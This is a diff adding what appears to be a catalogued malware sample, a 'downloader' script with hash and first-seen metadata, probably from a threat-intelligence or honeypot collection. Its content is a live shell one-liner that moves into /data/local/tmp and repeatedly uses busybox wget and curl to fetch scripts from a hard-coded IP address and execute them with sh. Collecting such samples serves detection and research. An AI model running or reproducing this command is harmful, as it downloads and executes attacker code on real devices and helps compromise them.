@@ -1,0 +1,10 @@
+# sha256: 1a14766e16dfb1ad4cac67935c034b0d56c0f05a1fefa76f40479a7a5d69d103
+# family: downloader
+# kind: script
+# size_bytes: 319
+# first_seen: 2026-07-22 15:56:57.604526 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+cd /data/local/tmp/; busybox wget http://45.130.151.214/w.sh; sh w.sh; curl http://45.130.151.214/c.sh; sh c.sh; wget http://45.130.151.214/wget.sh; sh wget.sh; curl http://45.130.151.214/wget.sh; sh wget.sh; busybox wget http://45.130.151.214/wget.sh; sh wget.sh; busybox curl http://45.130.151.214/wget.sh; sh wget.sh
